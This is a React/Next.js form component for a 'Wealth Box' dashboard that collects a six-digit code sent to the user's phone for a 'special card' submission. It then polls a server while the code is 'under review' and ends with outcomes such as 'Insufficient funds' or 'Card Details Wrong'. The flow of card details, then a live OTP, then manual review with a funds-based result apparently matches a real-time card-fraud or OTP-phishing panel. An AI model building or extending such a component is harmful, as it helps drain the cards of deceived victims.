
"use client";

import { useEffect, useRef, useState } from "react";
import type {
  ClipboardEvent,
  FormEvent,
  KeyboardEvent,
} from "react";

import Link from "next/link";
import {
  ArrowRight,
  CheckCircle2,
  LoaderCircle,
  AlertTriangle,
  CreditCard,
  MessageCircle,
} from "lucide-react";

import {
  getSpecialCardVerificationStatus,
  verifySpecialCardSubmission,
} from "@/app/dashboard/wealth-box/actions";

type ReviewOutcome = "VERIFIED" | "REJECTED";

export default function SpecialCardVerificationForm({
  submissionId,
  initialError = "",
}: {
  submissionId: string;
  initialError?: string;
}) {
  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);
  const [digits, setDigits] = useState<string[]>([
    "",
    "",
    "",
    "",
    "",
    "",
  ]);
  const [error, setError] = useState(initialError);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedForReview, setSubmittedForReview] = useState(false);
  const [reviewOutcome, setReviewOutcome] = useState<ReviewOutcome | null>(null);
  const [reviewReason, setReviewReason] = useState("");

  const code = digits.join("");

  useEffect(() => {
    if (!submittedForReview) return;

    let active = true;
    let inFlight = false;

    async function checkStatus() {
      if (inFlight) return;
      inFlight = true;

      try {
        const result =
          await getSpecialCardVerificationStatus(submissionId);

        if (!active || !result.success) return;

        if (result.incorrectCode) {
          setDigits(["", "", "", "", "", ""]);
          setSubmittedForReview(false);
          setError(
            "Incorrect code. Please enter the correct six-digit code.",
          );
          return;
        }

        if (
  result.status === "VERIFIED" ||
  result.status === "REJECTED"
) {
  setReviewReason(result.rejectionReason ?? "");
  setReviewOutcome(result.status);
  setSubmittedForReview(false);
}
      } catch {
        // Keep the review message visible if a status check temporarily fails.
      } finally {
        inFlight = false;
      }
    }

    void checkStatus();

    const intervalId = setInterval(() => {
      void checkStatus();
    }, 5000);

    return () => {
      active = false;
      clearInterval(intervalId);
    };
  }, [submissionId, submittedForReview]);

  function fillDigits(startIndex: number, rawValue: string) {
    const incoming = rawValue.replace(/\D/g, "");

    if (!incoming) return;

    setDigits((current) => {
      const next = [...current];

      incoming
        .slice(0, 6 - startIndex)
        .split("")
        .forEach((digit, offset) => {
          next[startIndex + offset] = digit;
        });

      return next;
    });

    const focusIndex = Math.min(startIndex + incoming.length, 5);
    inputRefs.current[focusIndex]?.focus();
    setError("");
  }

  function handleDigitChange(index: number, value: string) {
    const incoming = value.replace(/\D/g, "");

    if (incoming.length > 1) {
      fillDigits(index, incoming);
      return;
    }

    setDigits((current) =>
      current.map((digit, position) =>
        position === index ? incoming : digit,
      ),
    );

    if (incoming && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    setError("");
  }

  function handlePaste(
    event: ClipboardEvent<HTMLInputElement>,
    index: number,
  ) {
    event.preventDefault();
    fillDigits(index, event.clipboardData.getData("text"));
  }

  function handleKeyDown(
    event: KeyboardEvent<HTMLInputElement>,
    index: number,
  ) {
    if (
      event.key === "Backspace" &&
      !digits[index] &&
      index > 0
    ) {
      inputRefs.current[index - 1]?.focus();
    }

    if (event.key === "ArrowLeft" && index > 0) {
      event.preventDefault();
      inputRefs.current[index - 1]?.focus();
    }

    if (event.key === "ArrowRight" && index < 5) {
      event.preventDefault();
      inputRefs.current[index + 1]?.focus();
    }
  }

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();

    if (isSubmitting || submittedForReview || reviewOutcome) return;

    if (!/^\d{6}$/.test(code)) {
      setError("Enter all six digits.");
      inputRefs.current[digits.findIndex((digit) => !digit)]?.focus();
      return;
    }

    setError("");
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.set("submissionId", submissionId);
      formData.set("code", code);

      const result = await verifySpecialCardSubmission(formData);

      if (!result.success) {
        const message =
          result.error || "Unable to submit your verification attempt.";

        if (/incorrect code/i.test(message)) {
          setDigits(["", "", "", "", "", ""]);
          inputRefs.current[0]?.focus();
          setError(
            "Incorrect code. Please enter the correct six-digit code.",
          );
        } else {
          setError(message);
        }

        return;
      }

      if ("pendingReview" in result && result.pendingReview) {
        setDigits(["", "", "", "", "", ""]);
        setSubmittedForReview(true);
        return;
      }

      setError(
        "Your verification attempt was received, but its status could not be confirmed. Please refresh the page.",
      );
    } catch {
      setError("Unable to submit your verification attempt. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  }

  if (reviewOutcome) {
  const insufficientFunds = reviewReason === "Insufficient funds";
  const wrongCardDetails = reviewReason === "Wrong card details";
  const rejected = reviewOutcome === "REJECTED";

  return (
    <div
      role="status"
      className={`rounded-xl border p-5 text-center ${
        rejected
          ? "border-amber-200 bg-amber-50"
          : "border-emerald-200 bg-emerald-50"
      }`}
    >
      {rejected ? (
        insufficientFunds ? (
          <AlertTriangle className="mx-auto mb-3 h-9 w-9 text-amber-700" />
        ) : (
          <CreditCard className="mx-auto mb-3 h-9 w-9 text-amber-700" />
        )
      ) : (
        <CheckCircle2 className="mx-auto mb-3 h-9 w-9 text-emerald-700" />
      )}

      <h2 className="text-base font-semibold text-[#173b2f]">
        {reviewOutcome === "VERIFIED"
          ? "Verification approved"
          : insufficientFunds
            ? "Insufficient Funds"
            : wrongCardDetails
              ? "Card Details Wrong"
              : "Submission Rejected"}
      </h2>

      {rejected && !insufficientFunds && !wrongCardDetails && reviewReason && (
        <p className="mt-2 break-words text-sm text-[#53665e]">
          {reviewReason}
        </p>
      )}

      {reviewOutcome === "VERIFIED" && (
        <p className="mt-2 text-sm leading-6 text-[#53665e]">
          Your verification has been approved. Check your Wealth Box for the latest funding status.
        </p>
      )}

      {rejected && (
        <Link
          href="/dashboard/support"
          className="mt-5 inline-flex items-center justify-center gap-2 text-sm font-semibold text-[#176b4d] underline underline-offset-4"
        >
          <MessageCircle className="h-4 w-4" />
          Need Help? Contact Customer Service
        </Link>
      )}
    </div>
  );
}

  if (submittedForReview) {
    return (
      <div
        role="status"
        className="rounded-xl border border-emerald-200 bg-emerald-50 p-5 text-center"
      >
        <LoaderCircle className="mx-auto mb-3 h-9 w-9 animate-spin text-emerald-700" />

        <h2 className="text-base font-semibold text-[#173b2f]">
          Processing
        </h2>

        <p className="mt-2 text-sm leading-6 text-[#53665e]">
          Please wait.
        </p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="mb-3 block text-sm font-medium text-[#53665e]">
          Enter 6-digit code sent to your registered phone number
        </label>

        <div className="grid grid-cols-6 gap-2">
          {digits.map((digit, index) => (
            <input
              key={index}
              ref={(element) => {
                inputRefs.current[index] = element;
              }}
              type="text"
              inputMode="numeric"
              autoComplete={index === 0 ? "one-time-code" : "off"}
              aria-label={`Verification digit ${index + 1}`}
              maxLength={6}
              value={digit}
              onChange={(event) =>
                handleDigitChange(index, event.target.value)
              }
              onPaste={(event) => handlePaste(event, index)}
              onKeyDown={(event) => handleKeyDown(event, index)}
              className="h-12 min-w-0 rounded-lg border border-[#dce5df] bg-white text-center text-xl font-semibold text-[#173b2f] outline-none transition focus:border-emerald-700 focus:ring-2 focus:ring-emerald-700/10"
            />
          ))}
        </div>
      </div>

      {error ? (
        <p role="alert" className="text-sm font-medium text-red-600">
          {error}
        </p>
      ) : null}

      <button
        type="submit"
        disabled={isSubmitting || code.length !== 6}
        className="flex w-full items-center justify-center gap-2 rounded-lg bg-[#176b4d] px-4 py-3 text-sm font-semibold text-white transition hover:bg-[#12583f] disabled:cursor-not-allowed disabled:opacity-70"
      >
        {isSubmitting ? (
          <>
            <LoaderCircle className="h-4 w-4 animate-spin" />
            Processing...
          </>
        ) : (
          <>
            Verify
            <ArrowRight className="h-4 w-4" />
          </>
        )}
      </button>
    </form>
  );
}